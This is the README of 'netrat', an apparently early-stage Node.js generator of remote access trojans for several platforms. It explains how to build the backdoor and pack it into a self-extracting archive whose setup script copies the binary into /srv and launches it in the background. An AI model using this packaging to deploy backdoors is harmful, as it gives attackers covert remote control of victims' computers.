# netrat

[![NPM Version](https://img.shields.io/npm/v/netrat.svg)](https://www.npmjs.com/package/netrat)
![node](https://img.shields.io/node/v/netrat.svg)
[![Dependency Status](https://david-dm.org/roccomuso/netrat.png)](https://david-dm.org/roccomuso/netrat)
[![JavaScript Style Guide](https://img.shields.io/badge/code_style-standard-brightgreen.svg)](https://standardjs.com)
<span class="badge-patreon"><a href="https://patreon.com/roccomuso" title="Donate to this project using Patreon"><img src="https://img.shields.io/badge/patreon-donate-yellow.svg" alt="Patreon donate button" /></a></span>

> Damn easy multiplatform Node.js RAT generator

An easy tool to generate configurable backdoors that runs on Windows, Mac and Linux. Shells are upgradable to **Meterpreter**!

**Work in progres...** *do not use it yet*.

## Install

    $ git clone https://github.com/roccomuso/netrat.git
    $ npm install

## Usage

    $ npm start

It will start the building procedure that lets you customize your backdoor.

Under the hood we use [pkg](https://github.com/zeit/pkg) to build the executable.

To reduce the build size up to 4 times I recommend you to compress your binary file. Here's how to:

### Linux/Mac

Compress, extract and self-execute with [Makeself](https://github.com/megastep/makeself).

Makeself recommended `setup.sh` and command:

setup.sh:
```sh
#!/bin/sh
cp ./netrat-bin /srv/
chmod 755 /srv/netrat-bin
cd /srv
/srv/netrat-bin &
```

Then make sure that `setup.sh` and `netrat-bin` are in the same `build` directory and launch Makeself:

    $ ./makeself.sh build/ final.run "hello!" ./setup.sh

Now everything is inside `final.run`. When executed it will be temporary extracted in `/tmp/selfXXXXXX` and the setup will copy the bin in `/srv`.
Just notice that `setup.sh` doesn't contain any "execute on startup" logic yet.

### Windows

Use 7-zip self-extracting and execution feature for compression.

## Cross-platform commands

Commands starting with `shx` are backed with shelljs, providing an easy solution for simple Unix-like, cross-platform commands.

## Core modules

| Name | Build | Description |
|------|-------|-------------|
| [netcat](https://github.com/roccomuso/netcat) | [![Build Status](https://travis-ci.org/roccomuso/netcat.svg?branch=master)](https://travis-ci.org/roccomuso/netcat) | Netcat client and server modules written in pure Javascript for Node.js |
| [shelljs](https://github.com/shelljs/shelljs) | [![Travis](https://img.shields.io/travis/shelljs/shelljs/master.svg?style=flat-square&label=unix)](https://travis-ci.org/shelljs/shelljs) | Portable Unix shell commands for Node.js |
| [pkg](https://github.com/zeit/pkg) | [![Build Status](https://travis-ci.org/zeit/pkg.svg?branch=master)](https://travis-ci.org/zeit/pkg) | Package your Node.js project into an executable |

## Author

Rocco Musolino ([@roccomuso](https://twitter.com/roccomuso))
